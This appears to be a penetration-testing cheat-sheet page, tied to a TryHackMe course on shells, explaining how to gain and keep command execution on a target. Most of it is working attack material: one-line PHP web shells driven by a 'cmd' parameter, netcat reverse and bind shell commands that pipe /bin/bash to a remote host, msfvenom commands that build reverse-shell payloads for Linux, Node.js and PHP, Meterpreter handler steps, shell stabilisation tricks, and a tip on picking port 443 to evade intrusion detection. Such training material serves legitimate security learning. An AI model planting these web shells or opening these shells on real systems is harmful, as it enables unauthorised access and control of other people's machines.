# Shell

[![introtoshells](../../_badges/thmp/introtoshells.svg)](https://tryhackme.com/room/introtoshells)

<div class="row row-cols-md-2"><div>

The best kind of situation of a hacker is when it's possible to run commands on the target, or better, to run code on the target. The hacker will typically exploit a vulnerability <small>(ex: file upload, command injection...)</small> leading to a **RCE**

* Remote Command Execution
* Remote Code Execution

On Kali, you can find preinstalled reverse/web shells inside ([gitlab](https://gitlab.com/kalilinux/packages/webshells))

```bash
$ ls /usr/share/webshells
```
</div><div>

The script leading to a RCE could use

* a **reverse shell**: we open a port on our machine, and the target connect to it. We can run commands on the target, and hopefully do a successful privilege escalation.
* a **bind shell**: we open a port on the target and connect to it. This is like SSH, but we with a port we picked, and no login/password.
* a **web shell**: we are using a webpage with a form to run commands. It's a bit hard to use, but it may be the only way.

> To avoid alerting IDS, a bind/reverse shell should use a port that would not be suspected such as `443` (HTTPS).<br>
>
> It's not always possible to use a bind/reverse shell, there will most likely be a firewall blocking access.
</div></div>

<hr class="sep-both">

## web shell in PHP

If you created a file **xxx.php**, then you can run commands by accessing the URL **xxx.php?cmd=payload**. The result is wrapped with `<pre>` so that the result is not formatted and displayed raw. I added ` 2>&1` to redirect errors.

<div class="row row-cols-md-2 mt-4"><div>

* ‚û°Ô∏è compacted web shell with `shell_exec`  ([doc](https://www.php.net/manual/en/function.shell-exec.php))

```php
<?="<pre>".shell_exec(($_GET['cmd'] ?? "whoami")." 2>&1")."</pre>"; ?>
```

which is the same as

```php
<?php echo "<pre>".shell_exec(/* code */)."</pre>"; ?>
```

* ‚û°Ô∏è simple web shell with `system` ([doc](https://www.php.net/manual/en/function.system.php))

```php
<?php
echo "<pre>";
echo system(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
?>
```
</div><div>

* ‚û°Ô∏è simple web shell with `exec` ([doc](https://www.php.net/manual/en/function.exec.php))

```php
<?php
$output = "";
exec(($_GET["cmd"] ?? "whoami")." 2>&1", $output);
echo "<pre>".implode('<br>', $output)."</pre>";
?>
```

* ‚û°Ô∏è simple web shell with `passthru`  ([doc](https://www.php.net/manual/en/function.passthru.php))

```php
echo "<pre>";
echo passthru(($_GET["cmd"] ?? "whoami")." 2>&1");
echo "</pre>";
```
</div></div>

<hr class="sep-both">

## Reverse shell

<div class="row row-cols-md-2 mt-3"><div>

* ‚û°Ô∏èPHP pentest monkey

You could check out [this script by pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) (1.4k ‚≠ê, 2015).

```bash
$ cp /usr/share/webshells/php/php-reverse-shell.php /tmp/revshell.php
$ sed -i 's/127.0.0.1/HOST_IP/' /tmp/revshell.php
s sed -i 's/1234/PORT/' /tmp/revshell.php
```
</div><div>

* ‚û°Ô∏è Using netcat

```bash
# on the hacker machine run
$ nc -lnvp port
```

```bash
# on the target
$ nc HACKER_IP PORT -e /bin/bash
```
</div></div>

<hr class="sep-both">

## Bind shell

We are exchanging sides with what we do in reverse shells. Now you execute the code to listen on the target, and connect from your machine.

<div class="row row-cols-md-2"><div>

* ‚û°Ô∏è Example with netcat

```bash
# target
$ nc PORT -e /bin/bash # v1
```
```bash
# host
$ nc TARGT_IP PORT
```
</div><div>

</div></div>

<hr class="sep-both">

## Stabilize reverse/bind shells

<div class="row row-cols-md-2"><div>

Usually, when opening a reverse/bind shell, the shell is quite instable

* üöÄ you can't use commands requiring user input, such as `sudo` asking for a password

* üçÉ You can't clear nor resize your terminal

* üëë There is no autocompletion

* ‚õî If you press CTRL+C, the shell dies, so you can't cancel a remote command

> Note that note every shell can be upgraded. For instance, I had issues with the PHP reverse TCP shell in which I couldn't enter `bash` nor call `python` to upgrade my shell. But, when I used pentestmonkey reverse shell, the same commands you can see here worked.

* ‚û°Ô∏è Use a wrapper such as [penelope](https://github.com/brightio/penelope) (0.3k ‚≠ê)

```bash
$ git clone https://github.com/brightio/penelope.git
$ cd penelope
$ python penelope.py 4444
xxx@yyy:path$ # CTRL+C / ...
# on Linux: OK
# on Windows: only a basic shell
```
</div><div>

There are a few solutions way to make things better

* ‚û°  Manually

```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
xxx@yyy:path$ export TERM=xterm # can use clear...
xxx@yyy:path$ # CTRL+Z
kali@kali:/tmp$ stty raw -echo; fg
xxx@yyy:path$ # can use CTRL+C / ...
xxx@yyy:path$ exit
kali@kali:/tmp$ reset # restore your terminal
# you may have to close your terminal
# if it does not respond
```

* ‚û°Ô∏è Manually resize your terminal

First, open another terminal and resize it with the size you want. Use `stty -a` and take note of the number of rows/columns.

Then, In the terminal to resize, use `stty rows n` and `stty cols n`

* ‚û°Ô∏è Use a wrapper such as [rlwrap](https://github.com/hanslub42/rlwrap) (1.8k ‚≠ê)

```bash
$ sudo rlwrap nc -lvnp 4444
xxx@yyy:path$ # still CTRL+C not working
```
</div></div>

<hr class="sep-both">

## msfvenom to create shells

You can use msfvenom to generate all kinds of reverse shells.

<div class="row row-cols-md-2"><div>

* List payloads

```bash
$ msfvenom --list payloads
# payload opening a meterpreter - see metasploit
$ msfvenom --list payloads | grep meterpreter
```

* **Linux**

```bash
# execute /bin/bash -p
$ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o shell.elf
# Generate a .elf opening a reverse shell (TCP)
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
# Output a command (R=RAW) opening a reverse shell with netcat
# same as "-f raw" (to check)?
$ msfvenom -p cmd/unix/reverse_netcat LHOST=tun0 LPORT=4444 R
```
</div><div>

* **Node.js**

```bash
# Generate a .js opening a reverse shell (TCP)
$ msfvenom -p nodejs/shell_reverse_tcp LHOST=tun0 LPORT=4444 -o shell.js
```

* **PHP**

```bash
# very instable shell, not recommended
$ msfvenom -p php/reverse_php LHOST=tun0 LPORT=4444 -o revshell.php
# meterpreter
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -o revshell.php
```
</div></div>

<p class="text-center"><b>About Meterpreter</b></p>

<div class="row row-cols-md-2"><div>

You can use the metasploit console to catch a reverse shell, which may or may not be a reverse shell. You can then upgrade it to a meterpreter shell, and use a lot of commands/... provided by the framework.

```bash
$ msfconsole -q
msf6 > use multi/handler
msf6 exploit('multi/handler') > setg LHOST tun0
msf6 exploit('multi/handler') > setg LPORT 4444
# for instance, to catch a php/meterpreter/reverse_tcp
msf6 exploit('multi/handler') > set PAYLOAD php/meterpreter/reverse_tcp
msf6 exploit('multi/handler') > run
# then wait for a connection
# then you meterpreter will pop
meterpreter> help # see what you can do
# refer to the metasploit course
```
</div><div>

If you are using this with non-meterpreter bind/reverse shell

```bash
# run the exploit as a job (in the background)
msf6 exploit('multi/handler') > run -j
[XXX Session 1 XXX]
# upgrade session 1 to a meterpreter
msf6 exploit('multi/handler') > sessions -u 1
[XXX Session 2 XXX]
# move to the upgraded meterpreter
msf6 exploit('multi/handler') > sessions -i 2
meterpreter> help
```
</div></div>

<hr class="sep-both">

## Other tools

<div class="row row-cols-md-2"><div>

There is a **script** called [ShellPop](https://github.com/0x00-0x00/ShellPop) (1.4k ‚≠ê, 2018/2019) that is a simplified interface to create reverse/bind/web shells.

There is a **script** called [revshellgen](https://github.com/t0thkr1s/revshellgen) (0.3k ‚≠ê) that is an automated and simplified interface to create reverse/bind/web shells.
</div><div>

There is a **website** called [revshells](https://www.revshells.com/).
</div></div>